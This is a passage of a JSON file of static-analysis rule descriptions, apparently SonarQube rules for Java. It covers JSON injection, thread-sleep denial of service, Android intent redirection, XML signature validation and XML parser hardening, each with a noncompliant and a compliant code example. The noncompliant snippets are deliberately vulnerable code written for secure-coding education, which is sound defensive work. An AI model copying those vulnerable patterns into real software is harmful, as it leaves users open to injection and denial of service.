Map.of(\"key\", input);\n}\n</pre>\n<h3>How does this work?</h3>\n<p>In most cases, it is discouraged to build JSON strings with a direct concatenation of user input. While not always possible, a strong pattern-based\nvalidation can help sanitize tainted inputs. Likewise, converting to a harmless type can sometimes be a solution.</p>\n<p>However, avoiding handling objects' properties as strings by directly constructing Java objects should be the preferred way.</p>\n<h4>Programmatic object building</h4>\n<p>In most cases, an application can directly create objects from user input without having to build and parse a JSON string. Doing so prevents\ninjection vulnerabilities as JSON object construction libraries and functions will properly escape and check the type of input values.</p>\n<p>Sometimes, the application might need to include the user input in an object built from a trusted JSON string. In that case, the recommended\nsolution is to parse the trusted string first and then programmatically modify the resulting object.</p>\n<p>The example compliant code skips the use of a JSON parser and directly adds the user controlled data into a <code>Map</code> object. This way the\nattacker cannot control the keys and values of the <code>Map</code> object.</p>\n<h4>Converting to a harmless type</h4>\n<p>When the application allows it, converting user-submitted data to a harmless type can help prevent JSON injection vulnerabilities. In particular,\nconverting user inputs to numeric types is an efficient sanitation mechanism.</p>\n<p>This mechanism can be extended to other types, including more complex ones. However, care should be taken when dealing with them, as manually\nvalidating or sanitizing complex types can represent a challenge.</p>\n<p>Note that choosing this solution can be error-prone: every user input has to be validated or sanitized without oversight.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://www.talosintelligence.com/vulnerability_reports/TALOS-2018-0556\">CVE-2018-3879 - An exploitable JSON injection\n  vulnerability</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/76\">CWE-76 - Improper Neutralization of Equivalent Special Elements</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222609\">Application Security and\n  Development: V-222609</a> - The application must not be subject to input handling vulnerabilities. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6398","summary":"JSON operations should not be vulnerable to injection attacks","tags":["cwe","injection"],"versions":{"serverEdition":"Developer","serverVersion":"9.4.0.54424","communityVersion":null},"cleanCodeAttribute":"COMPLETE","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Character classes in regular expressions are a convenient way to match one of several possible characters by listing the allowed characters or\nranges of characters. If a character class contains only one character, the effect is the same as just writing the character without a character\nclass.</p>\n<p>Thus, having only one character in a character class is usually a simple oversight that remained after removing other characters of the class.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n\"a[b]c\"\n\"[\\\\^]\"\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n\"abc\"\n\"\\\\^\"\n\"a[*]c\" // Compliant, see Exceptions\n</pre>\n<h3>Exceptions</h3>\n<p>This rule does not raise when the character inside the class is a metacharacter. This notation is sometimes used to avoid escaping (e.g.,\n<code>[.]{3}</code> to match three dots).</p>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"targeted","ruleKey":"RSPEC-6397","summary":"Character classes in regular expressions should not contain only one character","tags":["regex"],"versions":{"serverEdition":"Developer","serverVersion":"9.5.0.56709","communityVersion":"9.5.0.56709"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Curly brace quantifiers in regular expressions can be used to have a more fine-grained control over how many times the character or the\nsub-expression preceeding them should occur. They can be used to match an expression exactly n times with <code>{n}</code>, between n and m times with\n<code>{n,m}</code>, or at least n times with <code>{n,}</code>. In some cases, using such a quantifier is superfluous for the semantic of the regular\nexpression, and it can be removed to improve readability. This rule raises an issue when one of the following quantifiers is encountered:</p>\n<ul>\n  <li> <code>{1,1}</code> or <code>{1}</code>: they match the expression exactly once. The same behavior can be achieved without the quantifier. </li>\n  <li> <code>{0,0}</code> or <code>{0}</code>: they match the expression zero times. The same behavior can be achieved by removing the expression.\n  </li>\n</ul>\n<h3>Noncompliant code example</h3>\n<pre>\n\"ab{1,1}c\"\n\"ab{1}c\"\n\"ab{0,0}c\"\n\"ab{0}c\"\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n\"abc\"\n\"ac\"\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"targeted","ruleKey":"RSPEC-6396","summary":"Superfluous curly brace quantifiers should be avoided","tags":["regex"],"versions":{"serverEdition":"Developer","serverVersion":"9.5.0.56709","communityVersion":"9.5.0.56709"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Sub-patterns can be wrapped by parentheses to build a group. This enables to restrict alternations, back reference the group or apply quantifier to\nthe sub-pattern.</p>\n<p>If this group should not be part of the match result or if no reference to this group is required, a non-capturing group can be created by adding\n<code>?:</code> behind the opening parenthesis.</p>\n<p>However, if this non-capturing group does not have a quantifier, or does not wrap an alternation, then imaging this group is redundant.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n\"(?:number)\\\\d{2}\"\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n\"number\\\\d{2}\"      \t// it is anyway required\n\"(?:number)?\\\\d{2}\"  \t// it is in fact optional\n</pre>\n<h3>Exceptions</h3>\n<p>This rule does not report an issue if the non-capturing group is an alternation.</p>\n<pre>\n\"(?:number|string)\"\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"targeted","ruleKey":"RSPEC-6395","summary":"Non-capturing groups without quantifier should not be used","tags":["regex"],"versions":{"serverEdition":"Developer","serverVersion":"9.5.0.56709","communityVersion":"9.5.0.56709"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Most modern applications use threads to handle incoming requests or other long-running tasks concurrently. In some cases, the number of concurrent\nthreads is limited to avoid system resource exhaustion due to too numerous actions being run.</p>\n<p>When an application uses user-controlled data as a parameter of a thread suspension operation, a Denial of Service attack can be made possible.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker with the capability to insert an arbitrary duration into a thread suspension operation could suspend the corresponding thread for a\nlong time. Depending on the applicationâs architecture and the thread handling logic, this can lead to a complete Denial of Service of the\napplication.</p>\n<p>Indeed, if the number of threads, either created by the application or allocated by a web server, is limited, the attacker will be able to suspend\nall of them at the same time. Without any remaining thread to handle actions, the application might badly answer, be slowed down, or become completely\nirresponsive.</p>\n<h2>How to fix it in Java Lang Package</h2>\n<h3>Code examples</h3>\n<p>This code is vulnerable to a Denial of Service because it sets a threadâs suspension time from user input without prior validation or\nsanitation.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) {\n  Long time = Long.parseLong(req.getParameter(\"time\"));\n  try {\n    Thread.sleep(time); // Noncompliant\n  } catch (InterruptedException e) {\n    resp.sendError(500);\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) {\n  Long time = Long.parseLong(req.getParameter(\"time\"));\n  try {\n    Thread.sleep(Math.min(time, 1000));\n  } catch (InterruptedException e) {\n    resp.sendError(500);\n  }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>In most cases, it is discouraged to define a thread suspension time from user-input.</p>\n<p>If really necessary, the application should ensure that the provided suspension time is below a safe limit. Such a limit should be evaluated and\nset to the lowest possible time that ensures the applicationâs operation and restricts denial of service attacks.</p>\n<p>The example compliant code uses the <code>Math.min</code> function to ensure the suspension duration is below the limit of one second.</p>\n<p>Note that even when the suspension time is limited, an attacker who submits numerous requests at high speed can still manage always to consume all\navailable threads.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/400\">CWE-400 - Uncontrolled Resource Consumption</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222667\">Application Security and\n  Development: V-222667</a> - Protections against DoS attacks must be implemented. </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222609\">Application Security and\n  Development: V-222609</a> - The application must not be subject to input handling vulnerabilities. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6390","summary":"Thread suspensions should not be vulnerable to Denial of Service attacks","tags":["cwe","denial-of-service","injection"],"versions":{"serverEdition":"Developer","serverVersion":"9.4.0.54424","communityVersion":null},"cleanCodeAttribute":"COMPLETE","type":"Vulnerability"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>Intent redirection vulnerabilities occur when an application publicly exposes a feature that uses an externally provided intent to start a new\ncomponent.</p>\n<p>In that case, an application running on the same device as the affected one can launch the exposed, vulnerable component and provide it with a\nspecially crafted intent. Depending on the applicationâs configuration and logic, this intent will be used in the context of the vulnerable\napplication, which poses a security threat.</p>\n<h3>What is the potential impact?</h3>\n<p>An affected component that forwards a malicious externally provided intent does so using the vulnerable applicationâs context. In particular, the\nnew component is created with the same permissions as the application and without limitations on what feature can be reached.</p>\n<p>Therefore, an attacker exploiting an intent redirection vulnerability could manage to access a private applicationâs components. Depending on the\nfeatures privately exposed, this can lead to further exploitations, sensitive data disclosure, or even persistent code execution.</p>\n<h4>Information disclosure</h4>\n<p>An attacker can use the affected feature as a gateway to access other components of the vulnerable application, even if they are not exported. This\nincludes features that handle sensitive information.</p>\n<p>Therefore, by crafting a malicious intent and submitting it to the vulnerable redirecting component, an attacker can retrieve most data exposed by\nprivate features. This affects the confidentiality of information that is not protected by an additional security mechanism, such as an encryption\nalgorithm.</p>\n<h4>Attack surface increase</h4>\n<p>Because the attacker can access most components of the application, they can identify and exploit other vulnerabilities that would be present in\nthem. The actual impact depends on the nested vulnerability. Exploitation probability depends on the in-depth security level of the application.</p>\n<h4>Privilege escalation</h4>\n<p>If the vulnerable application has privileges on the underlying devices, an attacker exploiting the redirection issue might take advantage of them.\nFor example by crafting a malicious intent action, the attacker could be able to pass phone calls on behalf of the entitled application.</p>\n<p>This can lead to various attack scenarios depending on the exploited permissions.</p>\n<h4>Persistent code execution</h4>\n<p>A lot of applications rely on dynamic code loading to implement a variety of features, such as:</p>\n<ul>\n  <li> Minor feature updates. </li>\n  <li> Application package size reduction. </li>\n  <li> DRM or other code protection features. </li>\n</ul>\n<p>When a component exposes a dynamic code loading feature, an attacker could use it during the redirectionâs exploitation to deploy malicious code\ninto the application. The component can be located in the application itself or one of its dependencies.</p>\n<p>Such an attack would compromise the application execution environment entirely and lead to multiple security threats. The malicious code could:</p>\n<ul>\n  <li> Intercept and exfiltrate all data used in the application. </li>\n  <li> Steal authentication credentials to third-party services. </li>\n  <li> Change the applicationâs behavior to serve another malicious purpose (phishing, ransoming, etc) </li>\n</ul>\n<p>Note that in most cases, the deployed malware can persist application or hosting device restarts.</p>\n<h2>How to fix it in Android</h2>\n<h3>Code examples</h3>\n<p>This code is vulnerable to intent injection attacks because it starts a new activity from a user-provided intent without prior validation.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class MainActivity extends AppCompatActivity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        Intent intent = getIntent();\n        Intent forward = (Intent) intent.getParcelableExtra(\"anotherintent\");\n        startActivity(forward);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class MainActivity extends AppCompatActivity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        Intent intent = getIntent();\n        Intent forward = (Intent) intent.getParcelableExtra(\"anotherintent\");\n        ComponentName name = forward.resolveActivity(getPackageManager());\n        if (name.getPackageName().equals(\"safePackage\") &amp;&amp; name.getClassName().equals(\"safeClass\")) {\n            startActivity(forward);\n        }\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>In general, security best practices discourage forwarding intents. However, when the application requires such a feature, it should precisely check\nthe forwarded intents to ensure they do not pass malicious content.</p>\n<p>Additionally, the components that are not meant to be accessed externally should be marked as non-exported in the applicationâs manifest. This is\ndone by setting the <code>android:exported</code> attribute of the components to <code>\"false\"</code>.</p>\n<h4>Checking the intent destination</h4>\n<p>Most unintended usage of the forwarding feature can be prevented by verifying whether the destination package and class names belong to a list of\naccepted components.</p>\n<p>The allow-list of accepted destinations should only contain components that perform non-sensitive actions and handle non-sensitive data. Moreover,\nit should not allow reaching components that further redirect inner intents.</p>\n<p>The example compliant code uses the <code>resolveActivity</code> method of the inner intent to determine its target component. It then uses the\n<code>getPackageName</code> and <code>getClassName</code> methods to validate this destination is not sensitive.</p>\n<h4>Checking the intent origin</h4>\n<p>Before forwarding the intent, the application can check its origin. Verifying the origin package is trusted prevents the forwarding feature from\nbeing used by an external component.</p>\n<p>The <code>getCallingActivity</code> method of the forwarded intent can be used to determine the origin component.</p>\n<h4>Permissions downgrade</h4>\n<p>Before forwarding an intent to another component, the application can verify or remove the permissions set on the forwarded intent. In that case,\neven if the destination is a sensitive component, the application can ensure the untrusted intent will not be able to read or write sensitive data or\nlocations.</p>\n<p>In most cases, the application should drop the following permissions from untrusted intents:</p>\n<ul>\n  <li> FLAG_GRANT_READ_URI_PERMISSION </li>\n  <li> FLAG_GRANT_WRITE_URI_PERMISSION </li>\n</ul>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Google Support - <a href=\"https://support.google.com/faqs/answer/9267555?hl=en\">Remediation for Intent Redirection Vulnerability</a> </li>\n  <li> Android Documentation - <a href=\"https://developer.android.com/topic/security/risks/intent-redirection\">Intent redirection</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://mas.owasp.org/checklists/MASVS-PLATFORM/\">Mobile AppSec Verification Standard - Platform Interaction Requirements</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage\">Mobile Top 10 2016 Category M1 - Improper\n  Platform Usage</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m4-insufficient-input-output-validation\">Mobile Top 10 2024 Category M4\n  - Insufficient Input/Output Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222609\">Application Security and\n  Development: V-222609</a> - The application must not be subject to input handling vulnerabilities. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6384","summary":"Components should not be vulnerable to intent redirection","tags":["android","injection"],"versions":{"serverEdition":"Developer","serverVersion":"9.3.0.51899","communityVersion":null},"cleanCodeAttribute":"COMPLETE","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>XML signatures are a method used to ensure the integrity and authenticity of XML documents. However, if XML signatures are not validated securely,\nit can lead to potential vulnerabilities.</p>\n<h2>Why is this an issue?</h2>\n<p>Before Java 17, XML Digital Signature API does not apply restrictions on XML signature validation unless the application runs with a security\nmanager, which is rare.</p>\n<h3>What is the potential impact</h3>\n<p>By not enforcing secure validation, the XML Digital Signature API is more susceptible to attacks such as signature spoofing and injections.</p>\n<h3>Increased Vulnerability to Signature Spoofing</h3>\n<p>By disabling secure validation, the application becomes more susceptible to signature spoofing attacks. Attackers can potentially manipulate the\nXML signature in a way that bypasses the validation process, allowing them to forge or tamper with the signature. This can lead to the acceptance of\ninvalid or maliciously modified signatures, compromising the integrity and authenticity of the XML documents.</p>\n<h3>Risk of Injection Attacks</h3>\n<p>Disabling secure validation can expose the application to injection attacks. Attackers can inject malicious code or entities into the XML document,\ntaking advantage of the weakened validation process. In some cases, it can also expose the application to denial-of-service attacks. Attackers can\nexploit vulnerabilities in the validation process to cause excessive resource consumption or system crashes, leading to service unavailability or\ndisruption.</p>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>For versions of Java before 17, secure validation is disabled by default unless the application runs with a security manager, which is rare. It\nshould be enabled explicitly by setting the <code>org.jcp.xml.dsig.secureValidation</code> attribute to true with the\n<code>javax.xml.crypto.dsig.dom.DOMValidateContext.setProperty</code> method.</p>\n<p>For Java 17 and higher, secure validation is enabled by default.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nNodeList signatureElement = doc.getElementsByTagNameNS(XMLSignature.XMLNS, \"Signature\");\n\nXMLSignatureFactory fac = XMLSignatureFactory.getInstance(\"DOM\");\nDOMValidateContext valContext = new DOMValidateContext(new KeyValueKeySelector(), signatureElement.item(0)); // Noncompliant\nXMLSignature signature = fac.unmarshalXMLSignature(valContext);\n\nboolean signatureValidity = signature.validate(valContext);\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nNodeList signatureElement = doc.getElementsByTagNameNS(XMLSignature.XMLNS, \"Signature\");\n\nXMLSignatureFactory fac = XMLSignatureFactory.getInstance(\"DOM\");\nDOMValidateContext valContext = new DOMValidateContext(new KeyValueKeySelector(), signatureElement.item(0));\nvalContext.setProperty(\"org.jcp.xml.dsig.secureValidation\", Boolean.TRUE);\nXMLSignature signature = fac.unmarshalXMLSignature(valContext);\n\nboolean signatureValidity = signature.validate(valContext);\n</pre>\n<h3>How does this work?</h3>\n<p>When XML Signature secure validation mode is enabled, XML Signatures are processed more securely. It enforces a number of restrictionsto to protect\nfrom XML Documents that may contain hostile constructs that can cause denial-of-service or other types of security issues.</p>\n<p>These restrictions can protect you from XML Signatures that may contain potentially hostile constructs that can cause denial-of-service or other\ntypes of security issues.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Oracle Java Documentation - <a\n  href=\"https://docs.oracle.com/en/java/javase/21/security/java-xml-digital-signature-api-overview-and-tutorial.html\">XML Digital Signature API\n  Overview and Tutorial</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10:2021 A02:2021 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/347\">CWE-347 - Improper Verification of Cryptographic Signature</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222608\">Application Security and\n  Development: V-222608</a> - The application must not be vulnerable to XML-oriented attacks. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"infeasible","ruleKey":"RSPEC-6377","summary":"XML signatures should be validated securely","tags":["symbolic-execution"],"versions":{"serverEdition":"Developer","serverVersion":"9.4.0.54424","communityVersion":"9.4.0.54424"},"cleanCodeAttribute":"CONVENTIONAL","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>XML parsers Denial of Service attacks target XML parsers, which are software components responsible for parsing and interpreting XML documents.</p>\n<h2>Why is this an issue?</h2>\n<p>XML files are complex data structures. When a malicious user is able to submit an XML file, it triggers complex processing that may overwhelm the\nparser. Most of the time, those complex processing are enabled by default, and XML parsers do not take preventive measures against Denial of Service\nattacks.</p>\n<h3>What is the potential impact?</h3>\n<p>When an attacker successfully exploits the vulnerability, it can lead to a Denial of Service (DoS) condition.</p>\n<h3>System Unavailability</h3>\n<p>Affected system becomes unresponsive or crashes, rendering it unavailable to legitimate users. This can have severe consequences, especially for\ncritical systems that rely on continuous availability, such as web servers, APIs, or network services.</p>\n<h3>Amplification Attacks</h3>\n<p>In some cases, XML parsers Denial of Service attacks can be used as a part of larger-scale amplification attacks. By leveraging the vulnerability,\nattackers can generate a disproportionately large response from the targeted system, amplifying the impact of their attack. This can result in\noverwhelming network bandwidth and causing widespread disruption.</p>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport javax.xml.parsers.DocumentBuilderFactory;\n\nDocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, false); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport javax.xml.parsers.DocumentBuilderFactory;\n\nDocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\n</pre>\n<h2>How to fix it in Dom4j</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nimport org.dom4j.io.SAXReader;\n\nSAXReader xmlReader = new SAXReader();\nxmlReader.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, false); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nimport org.dom4j.io.SAXReader;\n\nSAXReader xmlReader = new SAXReader();\nxmlReader.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\n</pre>\n<h2>How to fix it in Jdom2</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\nimport org.jdom2.input.SAXBuilder;\n\nSAXBuilder builder = new SAXBuilder();\nbuilder.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, false);  // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\nimport org.jdom2.input.SAXBuilder;\n\nSAXBuilder builder = new SAXBuilder();\nbuilder.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Java Documentation - <a\n  href=\"https://docs.oracle.com/en/java/javase/21/docs/api/java.xml/javax/xml/parsers/DocumentBuilderFactory.html\">DocumentBuilderFactory Class</a>\n  </li>\n  <li> Java Documentation - <a\n  href=\"https://docs.oracle.com/en/java/javase/21/docs/api/java.xml/javax/xml/parsers/SAXParserFactory.html\">SAXParserFactory Class</a> </li>\n  <li> Java Documentation - <a\n  href=\"https://docs.oracle.com/en/java/javase/21/docs/api/java.xml/javax/xml/validation/SchemaFactory.html\">SchemaFactory Class</a> </li>\n  <li> Java Documentation - <a\n  href=\"https://docs.oracle.com/en/java/javase/21/docs/api/java.xml/javax/xml/transform/TransformerFactory.html\">TransformerFactory Class</a> </li>\n  <li> Java Documentation - <a href=\"https://docs.oracle.com/en/java/javase/21/security/java-api-xml-processing-jaxp-security-guide.html\">Java API for\n  XML Processing (JAXP) Security Guide</a> </li>\n  <li> Dom4j Documentation - <a href=\"https://dom4j.github.io/javadoc/2.1.4/org/dom4j/io/SAXReader.html\">SAXReader Class</a> </li>\n  <li> Jdom2 Documentation - <a href=\"https://javadoc.io/static/org.jdom/jdom2/2.0.6.1/org/jdom2/input/SAXBuilder.html\">SAXBuilder class</a> </li>\n  <li> OWASP - <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java\">XXE Prevention Cheat\n  Sheet</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)\">Top 10 2017 Category A4 - XML External\n  Entities (XXE)</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m4-insufficient-input-output-validation\">Mobile Top 10 2024 Category M4\n  - Insufficient Input/Output Validation</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m8-security-misconfiguration\">Mobile Top 10 2024 Category M8 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/776\">CWE-776 - Improper Restriction of Recursive Entity References in DTDs ('XML Entity\n  Expansion')</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222593\">Application Security and\n  Development: V-222593</a> - XML-based applications must mitigate DoS attacks by using XML filters, parser options, or gateways. </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222667\">Application Security and\n  Development: V-222667</a> - Protections against DoS attacks must be implemented. </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222608\">Application Security and\n  Development: V-222608</a> - The application must not be vulnerable to XML-oriented attacks. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"infeasible","ruleKey":"RSPEC-6376","summary":"XML parsers should not be vulnerable to Denial of Service attacks","tags":["symbolic-execution"],"versions":{"serverEdition":"Developer","serverVersion":"9.4.0.54424","communityVersion":"9.4.0.54424"},"cleanCodeAttribute":"COMPLETE","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>This rule is deprecated; use {rule:java:S2755} instead.</p>\n<h2>Why is this an issue?</h2>\n<p>By default XML processors attempt to load all XML schemas and DTD (their locations are defined with <code>xsi:schemaLocation</code> attributes and\n<code>DOCTYPE</code> declarations), potentially from an external storage such as file system or network, which may lead, if no restrictions are put in\nplace, to <a href=\"https://owasp.org/www-community/attacks/Server_Side_Request_Forgery\">server-side request forgery (SSRF)</a> vulnerabilities.</p>\n<h3>Noncompliant code example</h3>\n<p>For <a href=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/DocumentBuilderFactory.html\">DocumentBuilder</a>, <a\nhref=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/SAXParserFactory.html\">SAXParser</a> and <a\nhref=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/SchemaFactory.html\">Schema</a> JAPX factories:</p>\n<pre>\nDocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setValidating(true); // Noncompliant\nfactory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", true); // Noncompliant\n\nSAXParserFactory factory = SAXParserFactory.newInstance();\nfactory.setValidating(true); // Noncompliant\nfactory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", true); // Noncompliant\n\nSchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);\nschemaFactory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", true); // Noncompliant\n</pre>\n<p>For <a href=\"https://dom4j.github.io/\">Dom4j</a> library:</p>\n<pre>\nSAXReader xmlReader = new SAXReader(); // Noncompliant\nxmlReader.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", true);  // Noncompliant\n</pre>\n<p>For <a href=\"http://www.jdom.org/\">Jdom2</a> library:</p>\n<pre>\nSAXBuilder builder = new SAXBuilder();\nbuilder.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", true); // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<p>For <a href=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/DocumentBuilderFactory.html\">DocumentBuilder</a>, <a\nhref=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/SAXParserFactory.html\">SAXParser</a> and <a\nhref=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/SchemaFactory.html\">Schema</a> JAPX factories:</p>\n<pre>\nDocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);\n\nSAXParserFactory factory = SAXParserFactory.newInstance();\nfactory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);\n\nSchemaFactory schemaFactory = 